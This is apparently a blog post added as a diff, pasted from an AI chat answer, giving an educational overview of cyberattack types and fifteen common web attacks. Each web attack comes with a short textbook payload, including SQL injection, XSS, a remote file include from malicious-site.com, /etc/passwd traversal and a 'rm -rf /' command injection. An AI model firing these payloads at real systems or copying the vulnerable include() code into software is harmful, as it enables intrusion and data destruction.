@@ -1,0 +1,377 @@
+---
+title: "Attacks"
+date: 2024-11-30 10:00:00 +0000
+categories: [Web Development, Deployment]
+tags: [deployment]
+toc: true
+---
+
+Certainly! Beyond **DDoS (Distributed Denial-of-Service)** attacks, there are many types of cyberattacks that target systems, networks, and data. Here's a categorized overview:
+
+---
+
+### **Network-Based Attacks**
+1. **Man-in-the-Middle (MITM):**
+   - An attacker intercepts communication between two parties to eavesdrop or manipulate the data being exchanged.
+
+2. **Packet Sniffing:**
+   - Capturing data packets traveling through a network to extract sensitive information like credentials.
+
+3. **DNS Spoofing:**
+   - Redirecting a user to a malicious website by corrupting the DNS resolver's cache.
+
+4. **ARP Spoofing:**
+   - Associating the attacker's MAC address with a legitimate IP address on a local network to intercept traffic.
+
+---
+
+### **Web Application Attacks**
+1. **SQL Injection:**
+   - Inserting malicious SQL statements into input fields to manipulate or extract database data.
+
+2. **Cross-Site Scripting (XSS):**
+   - Injecting malicious scripts into web pages, which execute in users' browsers, often stealing cookies or credentials.
+
+3. **Cross-Site Request Forgery (CSRF):**
+   - Forcing a logged-in user to execute unwanted actions, like transferring funds or changing account settings.
+
+4. **Remote File Inclusion (RFI):**
+   - Injecting remote scripts or files into a web application to execute malicious code.
+
+---
+
+### **System Exploits**
+1. **Privilege Escalation:**
+   - Exploiting vulnerabilities to gain higher access levels in a system.
+
+2. **Buffer Overflow:**
+   - Overloading a buffer with data to overwrite adjacent memory and execute arbitrary code.
+
+3. **Zero-Day Exploit:**
+   - Targeting vulnerabilities unknown to the vendor or public, often with devastating effects.
+
+4. **Malware:**
+   - Includes trojans, ransomware, spyware, and worms to compromise systems.
+
+---
+
+### **Social Engineering Attacks**
+1. **Phishing:**
+   - Deceptive emails or messages tricking users into revealing sensitive information.
+
+2. **Spear Phishing:**
+   - Highly targeted phishing attacks tailored for specific individuals or organizations.
+
+3. **Baiting:**
+   - Offering something enticing, like free software, that contains malware.
+
+4. **Pretexting:**
+   - Creating a fabricated scenario to manipulate someone into providing confidential information.
+
+---
+
+### **Advanced Persistent Threats (APTs)**
+1. **Supply Chain Attacks:**
+   - Compromising a third-party vendor to infiltrate a larger organization.
+
+2. **Trojanized Updates:**
+   - Distributing malware through legitimate software updates.
+
+3. **Data Exfiltration:**
+   - Stealthily transferring sensitive data out of a network over time.
+
+---
+
+### **Wireless Attacks**
+1. **Evil Twin:**
+   - Creating a rogue Wi-Fi network to trick users into connecting.
+
+2. **Bluejacking:**
+   - Sending unsolicited messages via Bluetooth.
+
+3. **Jamming:**
+   - Disrupting wireless communications to deny access to legitimate users.
+
+---
+
+### **Insider Threats**
+1. **Sabotage:**
+   - Disgruntled employees deliberately damaging systems or leaking information.
+
+2. **Data Theft:**
+   - Unauthorized copying or transfer of sensitive data by an insider.
+
+---
+
+### **Cryptographic Attacks**
+1. **Brute Force:**
+   - Trying all possible combinations to crack passwords or encryption.
+
+2. **Replay Attack:**
+   - Reusing intercepted credentials or data packets to gain unauthorized access.
+
+3. **Cryptanalysis:**
+   - Exploiting weaknesses in cryptographic algorithms to decrypt data.
+
+---
+
+### **IoT and Hardware Attacks**
+1. **Botnets:**
+   - Compromising IoT devices to create networks for launching attacks like DDoS.
+
+2. **Firmware Injection:**
+   - Injecting malicious firmware into hardware to control it.
+
+3. **Side-Channel Attacks:**
+   - Gleaning sensitive information from hardware emissions (e.g., timing, power consumption).
+
+---
+
+### **Physical Attacks**
+1. **USB Drops:**
+   - Leaving infected USB drives in public spaces, enticing people to plug them in.
+
+2. **Tampering:**
+   - Physically altering devices to introduce vulnerabilities.
+
+---
+
+For web-related attacks, here are the most common types along with brief explanations and examples:
+
+---
+
+### **1. SQL Injection (SQLi)**  
+**What it is:**  
+An attacker injects malicious SQL commands into an input field to manipulate a database.
+
+**Impact:**  
+- Extract sensitive data (e.g., usernames, passwords).  
+- Bypass authentication.  
+- Delete or modify database records.
+
+**Example:**  
+```sql
+Input: ' OR '1'='1
+Query: SELECT * FROM users WHERE username = '' OR '1'='1';
+```
+
+---
+
+### **2. Cross-Site Scripting (XSS)**  
+**What it is:**  
+An attacker injects malicious scripts into web pages viewed by users.  
+
+**Types:**  
+- **Stored XSS:** Code is stored on the server (e.g., in a comment section).  
+- **Reflected XSS:** Code is included in a URL and executed when the link is clicked.  
+
+**Impact:**  
+- Steal cookies or session tokens.  
+- Redirect users to malicious sites.
+
+**Example:**  
+```html
+<script>alert('Hacked!');</script>
+```
+
+---
+
+### **3. Cross-Site Request Forgery (CSRF)**  
+**What it is:**  
+An attacker tricks a user into performing unintended actions on a website where they’re authenticated.
+
+**Impact:**  
+- Fund transfers.  
+- Password changes.  
+
+**Example:**  
+A malicious link that silently triggers a POST request:  
+```html
+<form action="https://example.com/change-password" method="POST">
+    <input type="hidden" name="new_password" value="hacked123">
+</form>
+```
+
+---
+
+### **4. Remote File Inclusion (RFI)**  
+**What it is:**  
+An attacker uploads or includes a malicious file via a vulnerable web application.
+
+**Impact:**  
+- Code execution on the server.  
+- Compromise of the server.  
+
+**Example:**  
+```php
+<?php include($_GET['file']); ?>
+URL: http://example.com/page.php?file=http://malicious-site.com/malware.php
+```
+
+---
+
+### **5. Local File Inclusion (LFI)**  
+**What it is:**  
+Similar to RFI but uses local files on the server.
+
+**Impact:**  
+- Access sensitive server files (e.g., `/etc/passwd`).  
+- Execute server-side code.
+
+**Example:**  
+```php
+<?php include($_GET['file']); ?>
+URL: http://example.com/page.php?file=../../../../etc/passwd
+```
+
+---
+
+### **6. Directory Traversal**  
+**What it is:**  
+An attacker manipulates file paths to access restricted directories or files.
+
+**Impact:**  
+- Read sensitive files.  
+- Access configuration files, database credentials, etc.
+
+**Example:**  
+```http
+GET /../../../../etc/passwd HTTP/1.1
+```
+
+---
+
+### **7. Server-Side Request Forgery (SSRF)**  
+**What it is:**  
+An attacker tricks the server into making HTTP requests to internal resources or other services.
+
+**Impact:**  
+- Access internal services or APIs.  
+- Perform port scans.  
+
+**Example:**  
+```http
+URL: http://example.com/fetch?url=http://127.0.0.1/admin
+```
+
+---
+
+### **8. Command Injection**  
+**What it is:**  
+An attacker injects OS commands into an application’s input.
+
+**Impact:**  
+- Remote code execution.  
+- Compromise of the server.
+
+**Example:**  
+```bash
+Input: ; rm -rf /;
+```
+
+---
+
+### **9. Host Header Injection**  
+**What it is:**  
+Manipulating the `Host` header in HTTP requests to bypass authentication or redirect users.
+
+**Impact:**  
+- Cache poisoning.  
+- Redirect users to malicious sites.
+
+**Example:**  
+```http
+GET / HTTP/1.1
+Host: attacker.com
+```
+
+---
+
+### **10. HTTP Response Splitting**  
+**What it is:**  
+Injecting headers into HTTP responses to manipulate the server's response.
+
+**Impact:**  
+- Cache poisoning.  
+- Redirect to malicious websites.
+
+**Example:**  
+```
+Input: %0d%0aContent-Length:%200%0d%0a%0d%0a<script>alert('XSS')</script>
+```
+
+---
+
+### **11. JSON Web Token (JWT) Attacks**  
+**What it is:**  
+Exploiting JWT vulnerabilities such as weak signing algorithms or lack of verification.
+
+**Impact:**  
+- Bypass authentication.  
+- Hijack sessions.
+
+**Example:**  
+Using `none` as the algorithm to bypass token verification:  
+```json
+{
+  "alg": "none"
+}
+```
+
+---
+
+### **12. Open Redirects**  
+**What it is:**  
+An attacker exploits poorly validated redirect URLs to send users to malicious sites.
+
+**Impact:**  
+- Phishing.  
+- Malware downloads.
+
+**Example:**  
+```http
+URL: http://example.com/redirect?url=http://malicious-site.com
+```
+
+---
+
+### **13. Password Reset Poisoning**  
+**What it is:**  
+An attacker manipulates password reset links by injecting malicious URLs.
+
+**Impact:**  
+- Account takeover.  
+
+**Example:**  
+```http
+URL: https://malicious-site.com/reset?token=xyz
+```
+
+---
+
+### **14. Insecure Deserialization**  
+**What it is:**  
+Exploiting deserialization of untrusted data to execute malicious code.
+
+**Impact:**  
+- Remote code execution.  
+- Application compromise.
+
+**Example:**  
+Uploading a crafted serialized object with malicious payloads.
+
+---
+
+### **15. Weak Session Management**  
+**What it is:**  
+Improper handling of user sessions, such as predictable session IDs.
+
+**Impact:**  
+- Session hijacking.  
+
+**Example:**  
+Guessable session ID: `SID=123456`
+
+---
+
+Would you like a detailed example or protection measures for any specific attack?
